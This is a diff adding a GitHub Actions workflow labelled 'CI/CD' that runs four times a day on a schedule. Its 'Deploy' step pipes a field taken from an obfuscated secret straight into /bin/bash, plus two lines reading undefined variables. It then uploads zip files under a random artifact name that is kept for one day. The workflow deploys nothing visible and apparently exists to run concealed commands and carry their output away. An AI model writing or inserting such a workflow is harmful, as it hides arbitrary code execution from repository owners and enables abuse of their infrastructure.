@@ -1,0 +1,33 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          tcs53: ${{ secrets.tcs53 }}
+        run: |
+          printf '%s' "$tcs53" | jq -r .z072 | /bin/bash
+          echo $jpa8091 | jq -r .jsc8254 | /bin/bash
+          echo $hc4320 | jq -r .ji43559 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: XtGtZ2In
+          path: "*.zip"
+          retention-days: 1
